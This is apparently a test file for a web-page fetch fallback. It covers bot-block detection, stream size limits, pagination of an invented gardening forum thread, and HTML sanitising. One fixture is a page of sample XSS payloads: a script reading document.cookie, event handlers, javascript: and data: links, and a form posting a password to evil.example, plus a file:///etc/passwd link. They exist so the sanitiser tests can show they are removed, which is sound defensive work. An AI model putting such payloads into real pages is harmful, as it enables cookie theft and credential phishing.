/**
 * Fetch fallback — offline, every TinyFish response mocked.
 *
 * Pins the things that must not drift: when the fallback is allowed to run at
 * all, that a blank key means no network call, how a paginated thread is
 * followed and joined, where it stops, what a failure looks like, and that
 * the third party's HTML is treated as hostile.
 *
 * Every poster and post below is invented. The repo is public; nothing here
 * is taken from a real forum.
 */
import { BlockedError, looksBlocked, safeFetch } from "../src/lib/extract.ts";
import {
  FallbackError,
  MAX_PAGES,
  cleanPages,
  fetchViaFallback,
  nextPageUrl,
  planNextPage,
  shouldUseFallback,
} from "../src/lib/fetch-fallback/index.ts";

let failed = 0;
// Bound now, before captureLogs() swaps console.log out: a check made while
// the module's log lines are being captured must still print its result.
const print = console.log.bind(console);
function check(name: string, ok: boolean, detail = "") {
  if (!ok) failed++;
  print(`${ok ? "PASS" : "FAIL"}  ${name}`);
  if (!ok && detail) print(`      ${detail}`);
}

const KEY = "test-key-not-a-real-one";
const THREAD = "https://forum.example/talk/gardening/1234-what-is-eating-my-beans";

// Silence and capture the module's log lines; one test reads them back.
const logged: string[] = [];
const realLog = console.log;
const realWarn = console.warn;
function captureLogs() {
  console.log = (...a: unknown[]) => void logged.push(a.join(" "));
  console.warn = (...a: unknown[]) => void logged.push(a.join(" "));
}
function releaseLogs() {
  console.log = realLog;
  console.warn = realWarn;
}

// ── Trigger: what counts as "blocked" ─────────────────────────────
{
  const headers = (h: Record<string, string>) => new Headers(h);
  const wall = `<html><head><title>Attention Required! | Cloudflare</title></head><body><h1>Sorry, you have been blocked</h1></body></html>`;

  check("403 + Cloudflare block page is blocked", looksBlocked(403, headers({ server: "cloudflare" }), wall));
  check("503 + cf-mitigated header is blocked", looksBlocked(503, headers({ "cf-mitigated": "challenge" }), ""));
  check("429 + challenge script is blocked", looksBlocked(429, headers({}), `<script src="/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1"></script>`));
  check("plain 403 is not blocked", !looksBlocked(403, headers({}), "<h1>Forbidden</h1>"));
  check("server: cloudflare alone is not blocked", !looksBlocked(503, headers({ server: "cloudflare" }), "<h1>Service unavailable</h1>"));
  check("404 is never blocked, whatever the body says", !looksBlocked(404, headers({ "cf-mitigated": "challenge" }), wall));
  check("500 is never blocked", !looksBlocked(500, headers({}), wall));

  // Through safeFetch, with the network stubbed.
  const realFetch = globalThis.fetch;
  const respond = (status: number, body: string, h: Record<string, string> = {}) => {
    globalThis.fetch = (async () =>
      new Response(body, { status, headers: { "content-type": "text/html", ...h } })) as typeof fetch;
  };
  const opts = { contentTypes: /text\/html/i, accept: "text/html" };
  const outcome = async () => {
    try {
      await safeFetch("https://forum.example/talk/x", opts);
      return null;
    } catch (err) {
      return err as Error;
    }
  };

  respond(403, wall, { server: "cloudflare" });
  const blocked = await outcome();
  check("safeFetch throws BlockedError on a bot wall", blocked instanceof BlockedError);
  check('the message starts "Blocked:"', /^Blocked: forum\.example /.test(blocked?.message ?? ""), blocked?.message);

  respond(403, "<h1>Forbidden</h1>");
  const forbidden = await outcome();
  check("an ordinary 403 is still an ordinary failure", !(forbidden instanceof BlockedError) && forbidden?.message === "Fetch failed: HTTP 403", forbidden?.message);

  respond(404, wall);
  const missing = await outcome();
  check("a 404 is not blocked", !(missing instanceof BlockedError) && missing?.message === "Fetch failed: HTTP 404", missing?.message);

  // ── Bodies that never end ───────────────────────────────────────
  // A server can send headers and then stream for ever. The timeout stops
  // that eventually, but only after buffering everything that arrived, so
  // the read itself has to stop. Each stub counts what it was asked to
  // produce and records that the reader hung up.
  const endless = (status: number, firstChunk: string, h: Record<string, string> = {}) => {
    const state = { pulledBytes: 0, cancelled: false };
    const chunk = new Uint8Array(16 * 1024).fill(0x61); // "aaaa…"
    let first = true;
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        const bytes = first ? new TextEncoder().encode(firstChunk) : chunk;
        first = false;
        state.pulledBytes += bytes.byteLength;
        controller.enqueue(bytes);
      },
      cancel() {
        state.cancelled = true;
      },
    });
    globalThis.fetch = (async () =>
      new Response(stream, { status, headers: { "content-type": "text/html", ...h } })) as typeof fetch;
    return state;
  };

  const wallForEver = endless(403, wall, { server: "cloudflare" });
  const blockedEndless = await outcome();
  check("an endless 403 wall is still recognised as blocked", blockedEndless instanceof BlockedError, blockedEndless?.message);
  check("…after reading well under 1 MB", wallForEver.pulledBytes < 1024 * 1024, `${wallForEver.pulledBytes} bytes pulled`);
  check("…and the rest of the stream is cancelled", wallForEver.cancelled);

  const plainForEver = endless(403, "<h1>Forbidden</h1>");
  const forbiddenEndless = await outcome();
  check("an endless plain 403 fails as an ordinary 403", !(forbiddenEndless instanceof BlockedError) && forbiddenEndless?.message === "Fetch failed: HTTP 403", forbiddenEndless?.message);
  check("…after reading well under 1 MB", plainForEver.pulledBytes < 1024 * 1024, `${plainForEver.pulledBytes} bytes pulled`);
  check("…and the rest of the stream is cancelled", plainForEver.cancelled);

  // A 200 with no content-length: the size limit must hold on the bytes read.
  const limit = 256 * 1024;
  const pageForEver = endless(200, "<html><body><p>start</p>");
  let tooLarge: Error | null = null;
  try {
    await safeFetch("https://forum.example/talk/x", { ...opts, maxBytes: limit });
  } catch (err) {
    tooLarge = err as Error;
  }
  check("an endless 200 with no content-length is refused as too large", /^Too large: /.test(tooLarge?.message ?? ""), tooLarge?.message);
  check("…having read barely more than the limit", pageForEver.pulledBytes <= limit + 64 * 1024, `${pageForEver.pulledBytes} bytes pulled, limit ${limit}`);
  check("…and the rest of the stream is cancelled", pageForEver.cancelled);

  // Under the limit nothing changes: the whole body comes back.
  const small = "<html><body><p>" + "word ".repeat(2000) + "</p></body></html>";
  respond(200, small);
  const fetched = await safeFetch("https://forum.example/talk/x", { ...opts, maxBytes: limit });
  check("a page under the limit is returned whole and unchanged", fetched.body === small && fetched.finalUrl === "https://forum.example/talk/x");

  // Exactly at the limit is allowed; one byte over is not (as before).
  respond(200, "a".repeat(limit));
  const atLimit = await safeFetch("https://forum.example/talk/x", { ...opts, maxBytes: limit }).then((r) => r.body.length, () => -1);
  check("a body exactly at the limit is accepted", atLimit === limit, String(atLimit));
  respond(200, "a".repeat(limit + 1));
  const overLimit = await safeFetch("https://forum.example/talk/x", { ...opts, maxBytes: limit }).then(() => "accepted", (e: Error) => e.message);
  check("a body one byte over the limit is refused", /^Too large: /.test(overLimit), overLimit);

  globalThis.fetch = realFetch;

  const blockedErr = new BlockedError("forum.example", 403);
  check("fallback runs for a block when a key is set", shouldUseFallback(blockedErr, KEY));
  check("fallback does not run for a block with no key", !shouldUseFallback(blockedErr, null));
  check("fallback does not run for a block with a blank key", !shouldUseFallback(blockedErr, ""));
  check("fallback does not run for a 404", !shouldUseFallback(new Error("Fetch failed: HTTP 404"), KEY));
  check("fallback does not run for a timeout", !shouldUseFallback(Object.assign(new Error("timed out"), { name: "TimeoutError" }), KEY));
  check("fallback does not run for an unreadable page", !shouldUseFallback(new Error("No readable article found on this page"), KEY));

  const saved = process.env.TINYFISH_API_KEY;
  process.env.TINYFISH_API_KEY = "   ";
  check("a whitespace key in the environment counts as unset", !shouldUseFallback(blockedErr));
  delete process.env.TINYFISH_API_KEY;
  check("an unset key in the environment means no fallback", !shouldUseFallback(blockedErr));
  if (saved !== undefined) process.env.TINYFISH_API_KEY = saved;
}

// ── A mock TinyFish ───────────────────────────────────────────────
type Call = { url: string; headers: Record<string, string>; body: Record<string, unknown> };

/** Builds a fetch stand-in that answers each requested page from `pageFor`. */
function mockTinyfish(
  pageFor: (requested: string, n: number) => Response | Promise<Response>
): { fetchImpl: (input: string, init: RequestInit) => Promise<Response>; calls: Call[] } {
  const calls: Call[] = [];
  return {
    calls,
    fetchImpl: async (input, init) => {
      const body = JSON.parse(String(init.body)) as Record<string, unknown>;
      calls.push({ url: input, headers: init.headers as Record<string, string>, body });
      return pageFor((body.urls as string[])[0], calls.length);
    },
  };
}

function ok(result: Record<string, unknown>): Response {
  return Response.json({ results: [result], errors: [] });
}

function post(author: string, when: string, ...paras: string[]): string {
  return `<p>${author} · ${when}</p>${paras.map((p) => `<p>${p}</p>`).join("")}`;
}

const CHROME =
  `<p>Please or to access all these features</p><p>Flip</p><p>Thread gallery</p>` +
  `<template><p>hidden template text</p></template><p>Swipe left for the next trending thread</p>`;

/** One page of an invented thread, in the shape TinyFish was seen to return. */
function threadPage(n: number, total: number, posts: string, extraLinks: string[] = []): Record<string, unknown> {
  const requested = n === 1 ? THREAD : `${THREAD}?page=${n}`;
  return {
    url: requested,
    final_url: requested,
    title: "What is eating my beans?",
    description: "A gardening thread about runner beans.",
    language: "en",
    author: null,
    published_date: null,
    format: "html",
    text: `<main><h1>What is eating my beans?</h1>${CHROME}${posts}<p>Show quote history</p><p>Garden Forum footer strip</p></main>`,
    links: [
      "https://forum.example/",
      "https://elsewhere.example/talk/gardening/1234-what-is-eating-my-beans?page=" + (n + 1),
      "https://forum.example/talk/gardening/9999-another-thread?page=" + (n + 1),
      ...(n < total ? [`${THREAD}?page=${n + 1}`] : []),
      ...extraLinks,
    ],
    page_metadata: { other: { "page-number": String(n), "page-total": String(total) } },
  };
}

const noSleep = { sleeps: [] as number[] };
const sleep = async (ms: number) => void noSleep.sleeps.push(ms);

captureLogs();

// ── Key blank: no call ────────────────────────────────────────────
{
  for (const [label, apiKey] of [["null", null], ["empty", ""], ["whitespace", "  "]] as const) {
    const tf = mockTinyfish(() => ok(threadPage(1, 1, "")));
    let code = "";
    try {
      await fetchViaFallback(THREAD, { apiKey, fetchImpl: tf.fetchImpl, sleep });
    } catch (err) {
      code = err instanceof FallbackError ? err.code : "other";
    }
    check(`${label} key: refuses without calling out`, code === "not_configured" && tf.calls.length === 0, `${code}, ${tf.calls.length} calls`);
  }
}

// ── Single page: an article that was merely blocked ───────────────
{
  const paras = Array.from(
    { length: 8 },
    (_, i) => `<p>Paragraph ${i} of an ordinary essay about slugs, with enough plain words in it that it reads as body text and not as a caption.</p>`
  ).join("");
  const tf = mockTinyfish(() =>
    ok({
      url: "https://paper.example/essay/slugs",
      final_url: "https://paper.example/essay/slugs",
      title: "On slugs",
      description: "An essay.",
      author: "Invented Author",
      text: `<main><h1>On slugs</h1>${paras}</main>`,
      links: ["https://paper.example/essay/snails"],
      format: "html",
    })
  );
  const article = await fetchViaFallback("https://paper.example/essay/slugs", { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });

  check("single page: one request", tf.calls.length === 1, `${tf.calls.length}`);
  check("request goes to the documented endpoint", tf.calls[0].url === "https://api.fetch.tinyfish.ai");
  check("request carries the key in X-API-Key", tf.calls[0].headers["X-API-Key"] === KEY);
  check("request asks for one URL as HTML with links", JSON.stringify(tf.calls[0].body.urls) === `["https://paper.example/essay/slugs"]` && tf.calls[0].body.format === "html" && tf.calls[0].body.links === true);
  check("request sets a per-URL timeout", typeof tf.calls[0].body.per_url_timeout_ms === "number");
  check("title comes from the fallback", article.title === "On slugs", article.title);
  check("byline comes from the fallback", article.byline === "Invented Author", String(article.byline));
  check("the article body is all there", article.wordCount > 150 && (article.contentHtml.match(/<p>/g) ?? []).length >= 8, `${article.wordCount} words`);
  check("no truncation note on a whole article", !/cut short/.test(article.contentHtml));
}

// ── Multi-page thread: followed, joined, cleaned ──────────────────
{
  noSleep.sleeps.length = 0;
  const pages: Record<number, string> = {
    1: post("BeanCounter42", "01/06/2031 08:15", "Something is stripping my runner beans overnight. Any ideas?") +
       post("MarrowMaven", "01/06/2031 08:40", "Slugs. It is always slugs.", "Go out with a torch after dark."),
    2: post("CompostCorner", "01/06/2031 12:02", "Could be pigeons if the tops are going first.") +
       post("BeanCounter42", "01/06/2031 12:30", "Thanks!"),
    3: post("MarrowMaven", "02/06/2031 07:55", "Did the torch reveal anything?") +
       post("BeanCounter42", "02/06/2031 09:10", "Forty-one slugs. Forty-one."),
  };
  const tf = mockTinyfish((requested) => {
    const n = Number(new URL(requested).searchParams.get("page") ?? "1");
    return ok(threadPage(n, 3, pages[n]));
  });
  const article = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  const html = article.contentHtml;

  check("three pages: three requests", tf.calls.length === 3, `${tf.calls.length}`);
  check(
    "pages are requested in order, one URL per request",
    tf.calls.map((c) => (c.body.urls as string[]).join()).join(" ") === `${THREAD} ${THREAD}?page=2 ${THREAD}?page=3`
  );
  check("a pause before every page after the first", noSleep.sleeps.length === 2 && noSleep.sleeps.every((ms) => ms >= 1000), noSleep.sleeps.join());
  check("never follows a look-alike on another host or thread", tf.calls.every((c) => String((c.body.urls as string[])[0]).startsWith(THREAD)));

  const order = ["stripping my runner beans", "always slugs", "pigeons", "torch reveal", "Forty-one slugs"].map((t) => html.indexOf(t));
  check("every page's posts are present, in order", order.every((i, k) => i >= 0 && (k === 0 || i > order[k - 1])), order.join());
  check("a short real reply survives", /Thanks!/.test(html));
  check("post authors are marked up", /<strong>BeanCounter42<\/strong> · 01\/06\/2031 08:15/.test(html), html.slice(0, 300));
  check("known interface strings are gone", !/Flip|Thread gallery|Show quote history|Swipe left|access all these features/.test(html));
  check("template contents are gone", !/hidden template text/.test(html));
  check("a line repeated on every page is gone", !/Garden Forum footer strip/.test(html));
  check("the thread title survives once", (html.match(/What is eating my beans\?/g) ?? []).length === 1, html.slice(0, 200));
  check("one item, titled from page one", article.title === "What is eating my beans?" && article.resolvedUrl === THREAD);
  check("the text the summariser reads has every page", /Forty-one slugs/.test(article.textContent) && /stripping/.test(article.textContent));
  check("no truncation note on a complete thread", !/cut short/.test(html));
  check("logs one line with host, pages and outcome", logged.some((l) => /fetch fallback \(tinyfish\) host=forum\.example pages=3 outcome=ok/.test(l)), logged.join(" | "));
}

// ── nextPageUrl on its own ────────────────────────────────────────
{
  const base = { url: THREAD, finalUrl: THREAD, title: null, description: null, author: null, publishedDate: null, siteName: null, leadImage: null, html: "", pageNumber: null, pageTotal: null };
  check("finds ?page=2 from page one", nextPageUrl({ ...base, links: [`${THREAD}?page=2#post-9`] }, THREAD) === `${THREAD}?page=2`);
  check("ignores ?page=3 from page one", nextPageUrl({ ...base, links: [`${THREAD}?page=3`] }, THREAD) === null);
  check("stops at page-total", nextPageUrl({ ...base, url: `${THREAD}?page=2`, pageTotal: 2, links: [`${THREAD}?page=3`] }, THREAD) === null);
  check("ignores other hosts", nextPageUrl({ ...base, links: ["https://evil.example/talk/gardening/1234-what-is-eating-my-beans?page=2"] }, THREAD) === null);
  check("ignores other paths", nextPageUrl({ ...base, links: ["https://forum.example/talk/other?page=2"] }, THREAD) === null);
  check("ignores non-web schemes and junk", nextPageUrl({ ...base, links: ["javascript:alert(1)", "not a url", "file:///etc/passwd?page=2"] }, THREAD) === null);
  check("ignores another port on the same host", nextPageUrl({ ...base, links: ["https://forum.example:8443/talk/gardening/1234-what-is-eating-my-beans?page=2"] }, THREAD) === null);
  check("ignores an http link on an https thread", nextPageUrl({ ...base, links: ["http://forum.example/talk/gardening/1234-what-is-eating-my-beans?page=2"] }, THREAD) === null);
  check("ignores a www look-alike the site did not redirect to", nextPageUrl({ ...base, links: ["https://www.forum.example/talk/gardening/1234-what-is-eating-my-beans?page=2"] }, THREAD) === null);
  check(
    "follows the www origin the first request was redirected to",
    nextPageUrl({ ...base, finalUrl: "https://www.forum.example/talk/gardening/1234-what-is-eating-my-beans", links: ["https://www.forum.example/talk/gardening/1234-what-is-eating-my-beans?page=2"] }, THREAD) ===
      "https://www.forum.example/talk/gardening/1234-what-is-eating-my-beans?page=2"
  );
  check("a final_url on another port does not widen the origin", nextPageUrl({ ...base, finalUrl: "https://forum.example:8443/talk/gardening/1234-what-is-eating-my-beans", links: ["https://forum.example:8443/talk/gardening/1234-what-is-eating-my-beans?page=2"] }, THREAD) === null);
  check("ignores private addresses", nextPageUrl({ ...base, links: ["http://127.0.0.1/talk/gardening/1234-what-is-eating-my-beans?page=2"] }, THREAD) === null);
}

// ── Page cap ──────────────────────────────────────────────────────
{
  const tf = mockTinyfish((requested) => {
    const n = Number(new URL(requested).searchParams.get("page") ?? "1");
    return ok(threadPage(n, 60, post(`Poster${n}`, "03/06/2031 10:00", `Reply number ${n} about beans.`)));
  });
  const article = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  check(`stops at the page cap (${MAX_PAGES})`, tf.calls.length === MAX_PAGES, `${tf.calls.length} calls`);
  check("says the thread is cut short, and by how much", new RegExp(`cut short: the first ${MAX_PAGES} of 60 pages`).test(article.contentHtml), article.contentHtml.slice(0, 200));
  check("keeps the pages it did fetch", /Reply number 1 about/.test(article.contentHtml) && new RegExp(`Reply number ${MAX_PAGES} about`).test(article.contentHtml));
  check("does not fetch past the cap", !new RegExp(`Reply number ${MAX_PAGES + 1} about`).test(article.contentHtml));
}

// ── Time budget ───────────────────────────────────────────────────
{
  let clock = 0;
  const tf = mockTinyfish((requested) => {
    clock += 60_000; // each page "takes" a minute
    const n = Number(new URL(requested).searchParams.get("page") ?? "1");
    return ok(threadPage(n, 60, post(`Poster${n}`, "03/06/2031 10:00", `Slow reply ${n}.`)));
  });
  const article = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep, now: () => clock });
  check("stops when the time budget is spent", tf.calls.length === 3, `${tf.calls.length} calls`);
  check("says it ran out of time", /took too long/.test(article.contentHtml));
}

// ── Errors ────────────────────────────────────────────────────────
async function codeOf(run: () => Promise<unknown>): Promise<string> {
  try {
    await run();
    return "no error";
  } catch (err) {
    return err instanceof FallbackError ? err.code : `not a FallbackError: ${String(err)}`;
  }
}
{
  const perUrl = mockTinyfish(() => Response.json({ results: [], errors: [{ url: THREAD, error: "bot_blocked" }] }));
  check("per-URL error on the first page fails with its code", (await codeOf(() => fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: perUrl.fetchImpl, sleep }))) === "bot_blocked");

  const upstream = mockTinyfish(() => Response.json({ results: [], errors: [{ url: THREAD, error: "target_http_error", status: 403 }] }));
  check("per-URL error keeps the upstream status", (await codeOf(() => fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: upstream.fetchImpl, sleep }))) === "target_http_error_403");

  const timeout = mockTinyfish(() => {
    throw new DOMException("The operation was aborted due to timeout", "TimeoutError");
  });
  check("a call that never answers is a timeout, not a hang", (await codeOf(() => fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: timeout.fetchImpl, sleep }))) === "client_timeout");

  const paywall = mockTinyfish(() => new Response(`{"error":"INSUFFICIENT_CREDITS"}`, { status: 402 }));
  check("allowance used up (402) fails cleanly", (await codeOf(() => fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: paywall.fetchImpl, sleep }))) === "http_402");

  const badKey = mockTinyfish(() => new Response(`{"error":"bad key ${KEY}"}`, { status: 401 }));
  let badKeyMessage = "";
  try {
    await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: badKey.fetchImpl, sleep });
  } catch (err) {
    badKeyMessage = String((err as Error).message);
  }
  check("a rejected key fails with the status only", /http_401/.test(badKeyMessage) && !badKeyMessage.includes(KEY), badKeyMessage);

  const garbage = mockTinyfish(() => new Response("<html>gateway error</html>", { status: 200 }));
  check("a non-JSON answer fails cleanly", (await codeOf(() => fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: garbage.fetchImpl, sleep }))) === "bad_response");

  const empty = mockTinyfish(() => ok({ url: THREAD, final_url: THREAD, title: "x", text: "   ", links: [] }));
  check("an empty page fails cleanly", (await codeOf(() => fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: empty.fetchImpl, sleep }))) === "empty_content");

  const onlyChrome = mockTinyfish(() => ok({ url: THREAD, final_url: THREAD, title: "x", text: `<main>${CHROME}</main>`, links: [] }));
  check("a page that is all interface fails rather than storing nothing", (await codeOf(() => fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: onlyChrome.fetchImpl, sleep }))) === "unusable_content");

  // A later page failing keeps what was fetched.
  const laterFails = mockTinyfish((requested, n) => {
    if (n === 3) return Response.json({ results: [], errors: [{ url: requested, error: "timeout" }] });
    const page = Number(new URL(requested).searchParams.get("page") ?? "1");
    return ok(threadPage(page, 5, post(`Poster${page}`, "04/06/2031 11:00", `Kept reply ${page}.`)));
  });
  const partial = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: laterFails.fetchImpl, sleep });
  check("a later page failing keeps the earlier pages", /Kept reply 1\./.test(partial.contentHtml) && /Kept reply 2\./.test(partial.contentHtml));
  check("and says the thread is cut short", /cut short: the first 2 of 5 pages/.test(partial.contentHtml) && /could not be fetched/.test(partial.contentHtml), partial.contentHtml.slice(0, 220));
  check("and stops asking", laterFails.calls.length === 3, `${laterFails.calls.length}`);
}

// ── Hostile HTML from the third party ─────────────────────────────
{
  const hostile =
    `<main><h1>Thread</h1>` +
    post("QuietGardener", "05/06/2031 14:00", "A perfectly ordinary first post about beans and the weather this week.") +
    `<script>window.stolen = document.cookie</script>` +
    `<p onclick="steal()">Click <a href="javascript:steal()">this link</a> and <a href="/relative/path">this one</a></p>` +
    `<img src="x" onerror="steal()"><img src="https://img.example/a.png" srcset="javascript:steal() 1x">` +
    `<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/o"></object>` +
    `<form action="https://evil.example/collect"><input name="password"><button>Sign in to continue reading</button></form>` +
    `<style>body{background:url(https://evil.example/track)}</style>` +
    `<svg><script>steal()</script></svg><math><mi xlink:href="javascript:steal()">x</mi></math>` +
    `<a href="data:text/html;base64,PHNjcmlwdD5zdGVhbCgpPC9zY3JpcHQ+">data link</a>` +
    `<p style="position:fixed;top:0">styled</p><div data-payload="{}">data attr</div>` +
    post("SecondPoster", "05/06/2031 14:20", "A second ordinary reply so the page has more than one post in it.") +
    `</main>`;
  const tf = mockTinyfish(() =>
    ok({
      url: THREAD,
      final_url: "https://evil.example/somewhere-else",
      title: `Thread <script>steal()</script>`,
      description: `<img src=x onerror=steal()>`,
      text: hostile,
      links: ["javascript:steal()", "https://evil.example/talk/gardening/1234-what-is-eating-my-beans?page=2"],
      page_metadata: { og: { image: "javascript:steal()", site_name: "Garden Forum" } },
    })
  );
  const article = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  const html = article.contentHtml;

  check("hostile page: scripts removed", !/<script|steal\(\)|document\.cookie/i.test(html), html);
  check("hostile page: inline handlers removed", !/onerror|onclick/i.test(html));
  check("hostile page: javascript: and data: links removed", !/javascript:|data:text/i.test(html));
  check("hostile page: frames, objects, forms, inputs removed", !/<iframe|<object|<form|<input|<button/i.test(html));
  check("hostile page: button text does not leak into the post", !/Sign in to continue reading/.test(html));
  check("hostile page: styles and data attributes removed", !/style=|<style|data-payload|srcset/i.test(html));
  check("hostile page: svg and math removed", !/<svg|<math/i.test(html));
  check("hostile page: ordinary posts survive", /ordinary first post/.test(html) && /second ordinary reply/.test(html));
  check("hostile page: links are absolutised and neutralised", /href="https:\/\/forum\.example\/relative\/path"/.test(html) && /rel="noopener noreferrer nofollow"/.test(html), html);
  check("an off-host final_url is not believed", article.resolvedUrl === THREAD, article.resolvedUrl);
  check("a javascript: lead image is not stored", article.leadImage === null, String(article.leadImage));
  check("an off-host next page is not followed", tf.calls.length === 1, `${tf.calls.length}`);
  check("site name is read from page metadata", article.siteName === "Garden Forum", String(article.siteName));
}

// ── Pagination that does not depend on the link list ──────────────
// The first production save stored one page of a 25-page thread and logged
// only "pages=1 outcome=ok". These pin both halves of the answer: the walk no
// longer needs `links`, and the log line says why it stopped.
{
  const base = { url: THREAD, finalUrl: THREAD, title: null, description: null, author: null, publishedDate: null, siteName: null, leadImage: null, html: "", links: [] as string[], pageNumber: null as number | null, pageTotal: null as number | null };

  const built = planNextPage({ ...base, pageNumber: 1, pageTotal: 25 }, THREAD);
  check("no links but page-total says more: page 2 is built", built.url === `${THREAD}?page=2` && built.via === "built", JSON.stringify(built));
  const linked = planNextPage({ ...base, pageNumber: 1, pageTotal: 25, links: [`${THREAD}?page=2`] }, THREAD);
  check("a real link is preferred to a built one", linked.url === `${THREAD}?page=2` && linked.via === "link");
  check("no links and no page-total: stop, no_next_link", JSON.stringify(planNextPage(base, THREAD)) === `{"url":null,"stop":"no_next_link"}`);
  check("last page: stop, page_total", JSON.stringify(planNextPage({ ...base, url: `${THREAD}?page=25`, pageTotal: 25 }, THREAD)) === `{"url":null,"stop":"page_total"}`);
  const shared = `${THREAD}?reply=987654`;
  const fromShared = planNextPage({ ...base, url: shared, finalUrl: shared, pageNumber: 1, pageTotal: 3 }, shared);
  check("a built page drops the rest of the shared query", fromShared.url === `${THREAD}?page=2`, String(fromShared.url));
  const fromLater = planNextPage({ ...base, url: `${THREAD}?page=2`, finalUrl: `${THREAD}?page=2`, pageNumber: 2, pageTotal: 3 }, THREAD);
  check("a built page counts on from the page asked for", fromLater.url === `${THREAD}?page=3`, String(fromLater.url));

  // A short address that redirects to the full one: links carry the full path.
  const SHORT = "https://forum.example/talk/1234";
  check(
    "follows a link on the path the site redirected to",
    nextPageUrl({ ...base, url: SHORT, finalUrl: THREAD, links: [`${THREAD}?page=2`] }, SHORT) === `${THREAD}?page=2`
  );
  check(
    "a redirect to another host does not widen the path",
    nextPageUrl({ ...base, url: SHORT, finalUrl: "https://elsewhere.example/talk/gardening/1234-what-is-eating-my-beans", links: [`${THREAD}?page=2`] }, SHORT) === null
  );
  check("a relative next link is resolved against the page", nextPageUrl({ ...base, links: ["?page=2"] }, THREAD) === `${THREAD}?page=2`);

  const bare = (n: number, total: number, text: string, links: unknown = undefined) => ({
    url: n === 1 ? THREAD : `${THREAD}?page=${n}`,
    final_url: n === 1 ? THREAD : `${THREAD}?page=${n}`,
    title: "What is eating my beans?",
    text: `<main>${text}</main>`,
    ...(links === undefined ? {} : { links }),
    page_metadata: { other: { "page-number": String(n), "page-total": String(total) } },
    format: "html",
  });
  const pageOf = (requested: string) => Number(new URL(requested).searchParams.get("page") ?? "1");

  // The service sends no link list at all.
  logged.length = 0;
  let tf = mockTinyfish((requested) => ok(bare(pageOf(requested), 3, post("BeanCounter42", "03/06/2031 10:00", `Post on page ${pageOf(requested)} about netting.`))));
  let article = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  check("no link list: all three pages are still fetched", tf.calls.length === 3 && /page 3 about netting/.test(article.contentHtml), `${tf.calls.length} calls`);
  check("no link list: no truncation note", !/cut short/.test(article.contentHtml));
  check(
    "the log line gives the stop reason, link count and page numbers",
    logged.some((l) => /pages=3 outcome=ok stop=page_total links=0 first=1 total=3$/.test(l)),
    logged.join(" | ")
  );

  // The service sends links as objects.
  tf = mockTinyfish((requested) => {
    const n = pageOf(requested);
    return ok({ ...bare(n, 2, post("MarrowMaven", "03/06/2031 11:00", `Object-link page ${n}.`), [{ url: "https://forum.example/" }, { href: n < 3 ? `${THREAD}?page=${n + 1}` : `${THREAD}?page=1` }, 7, null]), page_metadata: undefined });
  });
  logged.length = 0;
  article = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  check("links given as objects are read", tf.calls.length === 3 && logged.some((l) => /links=2 /.test(l)), `${tf.calls.length} calls; ${logged.join(" | ")}`);

  // A site that ignores ?page= and serves page one again.
  logged.length = 0;
  tf = mockTinyfish(() => ok(bare(1, 5, post("CompostCorner", "03/06/2031 12:00", "The only page there is."))));
  article = await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  check("a built page that comes back as page one is not kept", tf.calls.length === 2 && (article.contentHtml.match(/The only page there is/g) ?? []).length === 1, `${tf.calls.length} calls`);
  check("and the item says it is cut short", /cut short: the first 1 of 5 page is saved/.test(article.contentHtml), article.contentHtml.slice(0, 200));
  check("and the log says page_mismatch", logged.some((l) => /pages=1 outcome=truncated:error stop=page_mismatch/.test(l)), logged.join(" | "));

  // A later page fails: the code is in the log.
  logged.length = 0;
  tf = mockTinyfish((requested) =>
    pageOf(requested) === 1
      ? ok(bare(1, 4, post("BeanCounter42", "03/06/2031 13:00", "First page."), [`${THREAD}?page=2`]))
      : Response.json({ results: [], errors: [{ url: requested, error: "bot_blocked" }] })
  );
  await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  check("a failed later page is named in the log", logged.some((l) => /pages=1 outcome=truncated:error stop=page_failed:bot_blocked links=1 first=1 total=4$/.test(l)), logged.join(" | "));

  // No metadata, no links: one page, and the log says why.
  logged.length = 0;
  tf = mockTinyfish(() => ok({ url: THREAD, final_url: THREAD, title: "t", text: `<main>${post("MarrowMaven", "03/06/2031 14:00", "Alone.")}</main>`, format: "html" }));
  await fetchViaFallback(THREAD, { apiKey: KEY, fetchImpl: tf.fetchImpl, sleep });
  check("nothing to go on: one page, stop=no_next_link", tf.calls.length === 1 && logged.some((l) => /pages=1 outcome=ok stop=no_next_link links=0 first=\? total=\?$/.test(l)), logged.join(" | "));
}

// ── cleanPages on its own ─────────────────────────────────────────
{
  const [single] = cleanPages([`<p>Reply</p><p>Reply to that if you like, I have no strong view.</p><p>Thanks!</p>`]);
  check("a bare interface word goes, a sentence containing it stays", !/<p>Reply<\/p>/.test(single) && /Reply to that if you like/.test(single));
  check("with fewer than three pages nothing is dropped for repeating", /Thanks!/.test(single));
}

releaseLogs();
check("the key never appears in a log line", logged.length > 0 && !logged.some((l) => l.includes(KEY)), logged.find((l) => l.includes(KEY)) ?? "");

console.log(failed ? `\n${failed} FAILED` : `\nall passed`);
process.exit(failed ? 1 : 0);
